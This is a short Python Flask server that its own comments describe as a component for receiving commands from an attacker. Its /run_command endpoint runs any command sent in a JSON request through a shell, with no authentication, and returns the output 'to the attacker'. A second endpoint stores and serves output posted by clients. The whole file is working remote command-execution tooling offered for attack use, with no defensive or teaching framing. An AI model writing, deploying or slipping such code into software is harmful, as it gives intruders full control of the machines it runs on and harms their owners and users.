## server side component using Flask to receive commands from the attacker.

"""Flask server component for executing commands and retrieving output."""

from flask import Flask, request
import subprocess

app = Flask(__name__)

# store the output of the most recent command
last_output = ""

@app.route('/run_command', methods=['POST'])
def run_command():
    # Extract the command from the JSON payload
    command = request.json['command']

    # Execute the command using subprocess
    try:
        output = subprocess.check_output(command, shell=True, text=True)
    except subprocess.CalledProcessError as err:
        output = err.output

    # store the output for later retrieval
    global last_output
    last_output = output

    # Return the output of the command to the attacker
    return output


@app.route('/command_output', methods=['GET', 'POST'])
def command_output():
    """Receive command output from clients or return the last stored output."""
    global last_output

    if request.method == 'POST':
        last_output = request.json.get('output', '')
        return '', 204

    return last_output
